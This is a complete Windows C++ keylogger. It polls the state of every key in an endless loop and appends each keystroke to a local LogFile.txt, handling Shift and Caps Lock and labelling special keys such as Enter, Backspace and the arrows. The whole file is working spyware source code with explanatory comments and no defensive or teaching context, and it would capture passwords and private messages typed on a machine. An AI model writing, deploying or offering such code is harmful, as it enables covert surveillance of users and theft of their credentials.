#include <iostream>     // For basic input/output (not used in this code)
#include <fstream>      // For file operations (ofstream)
#include <cctype>       // For character classification and conversion (e.g., tolower)
#include <map>          // For mapping key codes to characters or strings
#include <windows.h>    // For Windows API functions (GetAsyncKeyState, GetKeyState, etc.)
#include <winuser.h>    // For virtual key constants (e.g., VK_SHIFT, VK_CAPITAL)

using namespace std;

int main()
{
    int vcode;         // Holds the current virtual key code
    char character;    // Stores the ASCII character derived from the virtual key

    // Maps unshifted characters to their shifted equivalents (when Shift is held)
    map<char, char> shiftedChars = {
        {'[', '{'}, {']', '}'}, {'\\', '|'}, {';', ':'}, {'\'', '"'},
        {',', '<'}, {'.', '>'}, {'/', '?'}, {'`', '~'}, {'1', '!'},
        {'2', '@'}, {'3', '#'}, {'4', '$'}, {'5', '%'}, {'6', '^'},
        {'7', '&'}, {'8', '*'}, {'9', '('}, {'0', ')'}, {'-', '_'},
        {'=', '+'}
    };

    // Maps special virtual key codes to descriptive string labels
    map<int, string> specialKeys = {
        {8, " <bs> "}, {27, " <esc> "}, {13, "\n<enter>\n"}, {9, " <tab> "},
        {37, "\n<left_key>\n"}, {38, "\n<up_key>\n"}, {39, "\n<right_key>\n"},
        {40, "\n<down_key>\n"}, {17, " <ctrl> "}, {18, " <alt> "}
    };

    // Infinite loop to continuously monitor keyboard input
    for (;;)
    {
        // Check for keypress events in the range of virtual key codes (8–255)
        for (vcode = 8; vcode <= 255; vcode++)
        {
            // If the key was just pressed
            if (GetAsyncKeyState(vcode) == -32767)
            {
                // Open file in append mode
                ofstream write("LogFile.txt", ios::app);

                // Check Caps Lock and Shift states
                bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

                // Convert virtual key code to character (may return 0 for non-printables)
                character = MapVirtualKey(vcode, MAPVK_VK_TO_CHAR);

                // Handle alphabetical characters
                if (isalpha(character))
                {
                    // Use XOR to determine if we need to capitalize the letter
                    if (capsLockOn ^ shiftPressed)
                        write << character;  // Uppercase
                    else
                        write << char(tolower(character)); // Lowercase
                }

                // Handle numbers and symbols affected by Shift key
                else if ((vcode >= 186 && vcode <= 222) || (vcode >= 48 && vcode <= 57))
                {
                    if (shiftPressed && shiftedChars.count(character))
                        write << shiftedChars[character]; // Shifted symbol
                    else
                        write << character; // Unshifted
                }

                // Handle numpad keys and function keys (optional: may not be mapped properly)
                else if (vcode >= 96 && vcode <= 135)
                {
                    write << character; // Directly log the character
                }

                // Handle spacebar
                else if (vcode == 32)
                {
                    write << " ";
                }

                // Handle all other special keys (e.g., Enter, Backspace, Arrow Keys)
                else
                {
                    write << specialKeys[vcode];
                }

                write.close(); // Close the file stream
            }
        }
    }

    return 0;
}
